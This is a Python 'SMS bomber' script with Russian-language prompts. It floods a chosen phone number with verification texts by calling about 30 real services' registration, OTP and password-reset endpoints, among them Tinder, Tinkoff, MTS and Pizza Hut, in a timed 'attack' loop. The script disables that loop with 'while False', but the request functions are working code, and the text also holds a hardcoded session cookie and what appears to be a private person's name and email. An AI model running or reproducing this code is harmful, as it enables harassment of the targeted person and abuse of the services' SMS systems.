import requests
import random
import time

print('Привет, мой дорогой друг!')
print('Данный скрипт предназначен для отправки СМС на определенный номер.')
print('Данный скрипт работает исключительно с российскими номерами!')
print('Не используйте данный скрипт во зло.')
print('Для того, что бы остановить атаку нажмите "ctrl + Z"')
print('В случае, если скрипт стоит на месте длительное время нажмите "ctrl + C"')
print('С любовью Опоссум! <3')

DEBAG = False
timer = False
iteration = 0
start_time = time.monotonic()
name = ''
text = 'Sergey_Potapov'
delay = ''
phone = input('Введите номер: ')
if True:
    delay = input('Если хотите сделать задержку перед атакой, введите "1": ')
    attak_duration = int(input('Введите время атаки в секундах(0 == бессконечность): '))

if delay == '1':
    delay = int(input('Введите колличество секунд до начала атаки: '))
else:
    delay = 0

def timer(start_time):
    if attak_duration == 0:
        return False
    else:
        if attak_duration <= int( time.monotonic() - start_time):
            return True
        return False

if phone[0] == '+':
    phone = phone[1:]
if phone[0] == '8':
    phone = '7'+phone[1:]
if phone[0] == '9':
    phone = '7'+phone

phone9 = phone[1:]
phoneAresBank = '+'+phone[0]+'('+phone[1:4]+')'+phone[4:7]+'-'+ phone[7:9]+'-'+phone[9:11]
phone9dostavista = phone9[:3]+'+'+phone9[3:6]+'-'+phone9[6:8]+'-'+phone9[8:10]
phoneOstin = '+'+phone[0]+'+('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
phonePizzahut = '+'+phone[0]+' ('+phone[1:4]+') '+phone[4:7]+' '+phone[7:9]+' '+phone[9:11]
phoneGorzdrav = phone[1:4]+') '+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
phonee = '+' + phone[0] + ' '+phone[1:4]+ ' '+phone[4:7]+ ' '+phone[7:9]+ ' '+phone[9:11]

for i in range(12):
    name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
password = name
email = name+f'{iteration}'+'@gmail.com'


def spamm1(phone = phone):
    grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#-
def spamm2(phone9 = phone9):
    rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]
#-
def spamm3(phone = phone):
    belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
#-
def spamm4(phone=phone):
    tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
#-
def spamm5(phone=phone):
    vkusvill = requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php', data={'USER_PHONE': phone, 'token': '*','is_retry': 'Y'})
#-
def spamm6(phone=phone):
    karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
#+
def spamm7(phone = phone):
    uramobil = requests.post('https://service.uramobil.ru/profile/smstoken')
#переделать
def spamm8(phonee=phonee):
    taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': phonee})
    #переписать
def spamm9(phone=phone):
    tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
    #+
def spamm10(phone=phone):
    mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
    #+
def spamm11(phone=phone):
    youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
#+
def spamm12(phonePizzahut=phonePizzahut):
    pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'})
#-
def spamm13(phone=phone):
    rabota = requests.post('https://www.rabota.ru/remind', data={'credential': phone})
#-
def spamm14(phone=phone):
    rutube = requests.post('https://pass.rutube.ru/api/accounts/phone/check/?phone=%2B'+phone, data={'phone': '+'+phone})
#-
def spamm15(phone=phone):
    citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
    #+
def spamm16(phone=phone):
    findclone = requests.get(' https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})

def spamm17(text=text, name=name,phone=phone):
    pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': text, 'lastName': '***', 'phone': phone, 'email': name+'@gmail.com', 'password': name, 'passwordConfirm': name}})
    #-
def spamm18(phone=phone, name = name):
    smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': 'Сергей','phone': phone, 'promo': 'yellowforma'})
    #переписать
def spamm19(phone=phone):
    lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
    # что то с сайтом
def spamm20(phone9=phone9):
    oyorooms = requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en')
    #-
def spamm21(phone=phone):
    mvideo = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=',data ={ 'phone': '+7 904 1758061', 'g-recaptcha-response': '', 'recaptcha': 'off'})
    #переписать
def spamm22(phone=phone):
    newnext = requests.get('https://newnext.ru/graphql' )
    #что то с сайтом
def spamm23(phone=phone):
    s7 = requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': phone[1:4], 'mobilePhone.localNumber': phone[4:-1]})
    #-
def spamm24(phone=phone):
    sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
    #+
def spamm25(phoneGorzdrav=phoneGorzdrav):
    sessions = requests.Session()
    gorzdrav = sessions.get('https://gorzdrav.org', headers={'Accept':' text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Cookie':' _ga=GA1.2.1187155566.1577558668; _gid=GA1.2.1763005552.1577558668; _ym_uid=1577558668479182416; _ym_d=1577558668; uxs_uid=157e9740-29a2-11ea-8ea8-e10d48ed0296; uxs_mig=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_isad=1; mindboxDeviceUUID=6a571ed8-fac6-4572-8d4b-0b2a9b3a22d7; directCrm-session=%7B%22deviceGuid%22%3A%226a571ed8-fac6-4572-8d4b-0b2a9b3a22d7%22%7D; route=beff76b1868b06cb4363c85b83a01ae0; JSESSIONID=E60010428F1D894E930A20DBA52A36A7.prd-hybris-app-06; _ym_visorc_970674=w; AF_BANNERS_SESSION_ID=1577603011675',
        'Host': 'gorzdrav.org',
        'Save-Data': 'on',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.3.320 Yowser/2.5 Safari/537.36'})
    print(gorzdrav.status_code)
    gorzdrav = sessions.post('https://gorzdrav.org/login/register/sms/send', data ={'phone': phoneGorzdrav,
        'reCaptchaIsChecked': 'on',
        'isVisibleCaptcha': 'true'})
    print(gorzdrav.status_code)

def spamm26(email=email, phone=phone):
    alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': "personal", 'first_name': "Rustam", 'last_name': "Guluev", 'email': "kken010724@gmail.com"})
    #переписать
def spamm27(phone=phone, password = password):
    invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/registration', data={'emailOrPhone': phone,'password': password,'passwordConfirmation': password,'termsAgreeBox': 'on','nextStep': '1','termsAgree': '1'})
    #+
def spamm28(phone = phone):
    onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
    #капча
def spamm29(phone=phone):
    psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
    #+
def spamm30(phone=phone):
    beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
    #+
print('Началась атака!')
start_time = time.monotonic()
while False:
    if  timer(start_time):
        break
    try:
        spamm1()
        spamm2()
        spamm3()
        spamm4()
        spamm5()
        spamm6()
        #spamm7()
        #spamm8()
        spamm9()
        spamm10()
        spamm11()
        spamm12()
        spamm13()
        spamm14()
        spamm15()
        #spamm16()
        spamm17()
        spamm18()
        spamm19()
        spamm20()
        spamm21()
        spamm22()
        #spamm23()
        spamm24()
        spamm25()
        spamm26()
        spamm27()
        spamm28()
        spamm29()
        spamm30()
    except:
        print('ERROR')
    iteration += 1
    print('Пройдено {0} итераций!'.format(iteration), 'время атаки {0} сек!'.format(round(time.monotonic() - start_time)))
else:
    if DEBAG == False:
        print('Атака завершена!')

while DEBAG == True:
    print('if the error crashes, then put " # " before the function that creates this error')
    spamm1()
    spamm2()
    spamm3()
    spamm4()
    spamm5()
    spamm6()
    #spamm7()
    #spamm8()
    spamm9()
    spamm10()
    spamm11()
    spamm12()
    spamm13()
    spamm14()
    spamm15()
    #spamm16()
    spamm17()
    spamm18()
    spamm19()
    spamm20()
    spamm21()
    spamm22()
    #spamm23()
    spamm24()
    spamm25()
    spamm26()
    spamm27()
    spamm28()
    spamm29()
    spamm30()
    print('No bag')
    break

while True:
    spamm25()
    break
# мне лень поддерживать код длительное время, он не будет работать на все 100%. на декабрь 2019 г он выдает 30 смс/минута
